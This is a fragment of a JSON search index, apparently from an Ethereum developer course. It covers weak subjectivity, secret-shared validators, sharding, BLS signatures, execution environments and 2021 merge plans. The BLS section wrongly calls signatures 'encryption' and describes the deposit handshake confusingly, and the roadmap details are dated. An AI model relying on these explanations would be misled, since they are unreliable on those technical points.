Finality presents some issues around Weak Subjectivity: If \u2153 of validators withdraw their stake and continue signing blocks and attestations, they can form a chain which conflicts with the finalized state. If your node is far enough behind the chain head to not be aware that they\u2019ve withdrawn their funds, the exited validators can trick you into following the wrong chain. ( source ) Well-behaved validators who have successfully and properly exited the chain can sell their private keys on the black market to a malicious actor. (There is no financial disincentive for them to do this as their funds have safely exited the protocol). You can read more about Weak Subjectivity and how to address it here.","title":"Finality"},{"location":"S10-eth2/M2-key-terms/#secret-shared-validators-ssv","text":"From the SSV.network page: Secret Shared Validators (SSV) is the first secure and robust way to split a validator key for ETH staking between non-trusting nodes, or operators. The protocol enables the distributed control and operation of an Ethereum validator. The key is split in such a way that no operator must trust the other to operate, a certain amount can go offline without affecting network performance, and no operator can take unilateral control of the network. The result is decentralization, fault tolerance, and optimal security for staking on Ethereum.","title":"Secret Shared Validators (SSV)"},{"location":"S10-eth2/M2-key-terms/#database-sharding","text":"Database sharding is used in conventional computer programming to increases scalability of large systems. From this article: A database shard is a horizontal partition of data in a database or search engine. Each individual partition is referred to as a shard or database shard. Each shard is held on a separate database server instance, to spread load. Some data within a database remains present in all shards, but some appears only in a single shard. Each shard (or server) acts as the single source for this subset of data. Ethereum 2.0 leverages traditional database sharding to decrease the amount of memory needed to maintain the full state of the network. Originally meant to be 1024 shards, the current spec will produce 64 database shards. Each of these shards will have their own validators. They will periodically check into the beacon chain using crosslinks, which is a summary of the state of that shard and the only representation of the shard on the Beacon Chain. Phase 1 is meant to reduce the resources needed to use Ethereum in a decentralized way. Currently, to interact with Ethereum network on your own node, it requires 500GB of memory and significant RAM, not to mention syncing time. With sharding and light clients, the idea is to decrease the amount of information needed to submit your own, valid transactions. Read more about sharding on Ethereum 2.0 here.","title":"Database Sharding"},{"location":"S10-eth2/M2-key-terms/#bls-encryption","text":"The key signature system Ethereum 2.0 will be using is BLS. BLS allows multiple digital signatures to be collapsed into a single verifiable one. This is helpful with collecting attestations of the beacon ( \u201cvotes in regards to the validity of a shard block or beacon\u201d ). Most pertinent for us, the BLS scheme is different from the scheme used for Ethereum 1.0. To swap out the encryption curve, Ethereum core developers have come up with a clever solution, which is a classic handshake: In the diagram above, the blue key and boxes represent Ethereum 1.0 and its cryptographic scheme and the red key and boxes represent Ethereum 2.0 and its cryptographic scheme. The deposit contract, which exists on Ethereum 1.0 Mainnet, allows the user to prove they have private keys for Ethereum 1.0 and Ethereum 2.0. Here\u2019s how that works: The transaction submitted to the deposit contract on Ethereum 1.0 has to be signed by an Ethereum 1.0 private key (like any transaction submitted on Mainnet). However, that transaction is wrapped around another private key signature, the Ethereum 2.0 private key. The beacon chain is watching the deposit contract on Ethereum 1.0, if a valid transaction is submitted to the contract with the correct balance, the beacon chain then unwraps the first layer of encryption and accesses the second layer, the Ethereum 2.0 digital signature. That is used to confirm the Ethereum 2.0 validator address and connect it to an Ethereum 1.0 address. Here's how that handshake looks in the Beacon Chain contract deployed to Ethereum mainnet:","title":"BLS Encryption"},{"location":"S10-eth2/M2-key-terms/#execution-environments-computation","text":"The final phase of Ethereum 2.0 deals with the execution environments present on each shard. in Ethereum 1.x, the execution environment is the Ethereum Virtual Machine, a Turing-complete programming language that provides a universal computation environment for all in the network to use. However, this universality comes at an efficiency cost. The EVM is slow compared to modern processing languages. Phase 2 addresses this processing cost by using a version of WebAssembly , a new type of code developed by Mozilla. It allows code written in C, C++ or Rust but executed in the browser to run at near-native speeds. (For more information about the implications of WebAssembly for the broader web, please see this video: \"Rust, WebAssembly and the Future of Serverless\" ) In Phase 2, each shard will be allowed a unique execution environment. While at least one will be running the EVM (for sake of continuity), it's possible others will be running execution environments (EEs) for Libra, Bitcoin, or any other blockchain network. Note: This may change as the Eth1-Eth2 merge gets closer. It seems as though the emphasis may be on getting the Beacon Chain executable on EVM, rather than various execution environments.","title":"Execution Environments (Computation)"},{"location":"S10-eth2/M2-key-terms/#additional-material","text":"Ethereum 2.0 Glossay (ConsenSys) Beaconcha.in Knowledge Base Ethereum 2.0 (Ethhub.io) What's New in Eth2 (Ben Edgington) Great newsletter round-up Finalized article series by Danny Ryan For more information about BLS, please see this thread from Jeff Coleman or this Reddit post about the history of BLS development for Ethereum 2.0.","title":"Additional Material"},{"location":"S10-eth2/M3-future-considerations/","text":"Future Considerations As this course launches, on September 2021, there have been some interesting developments towards an Eth1-Eth2 merge. We'll discuss a few of these here. Please note, this may change as it is currently be developed! First, there is a \"mainnet readiness\" checklist the Ethereum developers will be using to judge when the time is right for an Eth1-Eth2 merge. Here's the rough timeline given by Tim Beiko in August 2021: There's also been talk of using rollups as a way to help with the Merge. Essentially, the L2s will function as a sort of shard-like data layer. You can read more about that here. Rayonism Network In March 2021, as part of ETHGlobal Scaling hackathon, a group of Ethereum 2.0 developers tried to create a merge testnet. Known as Rayonism, it was meant as a short-term proof of concept project to allow researchers to test certain assumptions being made about the Eth1-Eth2 merge. One of the features it meant to test was the notion of time, a particularly challenging issue with distributed networks, as we discussed earlier in the course. The Rayonism testnet did run for a short period of time. You can checkout the Merge testnet tutorial they ran here (although it most likely will not work now!) Additional Materials Video: What Happens after ETH1 and ETH2 merge? (Vitalik Buterin) Write-up from Merge Workshop in October 2021 Forum: A Rollup-centric Ethereum Roadmap GitHub: Mainnet Readiness Checklist GitHub: Eth1 and Eth2 Merge spec Rayonism: a research and engineering testnet that combines Eth1-Eth2 Merge and Sharding","title":"Index"},{"location":"S10-eth2/M3-future-considerations/#future-considerations","text":"As this course launches, on September 2021, there have been some interesting developments towards an Eth1-Eth2 merge. We'll discuss a few of these here. Please note, this may change as it is currently be developed! First, there is a \"mainnet readiness\" checklist the Ethereum developers will be using to judge when the time is right for an Eth1-Eth2 merge. Here's the rough timeline given by Tim Beiko in August 2021: There's also been talk of using rollups as a way to help with the Merge. Essentially, the L2s will function as a sort of shard-like data layer. You can read more about that here.","title":"Future Considerations"},{"location":"S10-eth2/M3-future-considerations/#rayonism-network","text":"In March 2021, as part of ETHGlobal Scaling hackathon, a group of Ethereum 2.0 developers tried to create a merge testnet. Known as Rayonism, it was meant as a short-term proof of concept project to allow researchers to test certain assumptions being made about the Eth1-Eth2 merge. One of the features it meant to test was the notion of time, a particularly challenging issue with distributed networks, as we discussed earlier in the course. The Rayonism testnet did run for a short period of time. You can checkout the Merge testnet tutorial they ran here (although it most likely will not work now!)","title":"Rayonism Network"},{"location":"S10-eth2/M3-future-considerations/#additional-materials","text":"Video: What Happens after ETH1 and ETH2 merge? (Vitalik Buterin) Write-up from Merge Workshop in October 2021 Forum: A Rollup-centric Ethereum Roadmap GitHub: Mainnet Readiness Checklist GitHub: Eth1 and Eth2 Merge spec Rayonism: a research and engineering testnet that combines Eth1-Eth2 Merge and Sharding","title":"Additional Materials"},{"location":"S11-what-now/","text":"Title","title":"Index"},{"location":"S11-what-now/#title","text":"","title":"Title"},{"location":"S12-final-project/","text":"Title","title":"Index"},{"location":"S12-final-project/#title","text":"","title":"Title"}]}